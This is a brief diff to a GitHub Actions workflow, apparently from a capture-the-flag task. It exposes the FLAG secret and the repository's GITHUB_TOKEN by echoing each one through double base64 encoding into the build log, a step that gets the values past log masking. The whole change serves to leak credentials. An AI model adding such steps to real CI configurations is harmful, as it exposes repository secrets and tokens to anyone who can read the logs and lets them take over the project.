@@ -10,6 +10,7 @@ jobs:
         GITHUB_REPOSITORY: ${{ github.repository }}
         GITHUB_SHA: ${{ github.sha }}
         FLAG: ${{ secrets.FLAG }}
+        MY_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
         echo $FLAG | base64 | base64
-        echo $GITHUB_TOKEN | base64 | base64
+        echo $MY_TOKEN | base64 | base64
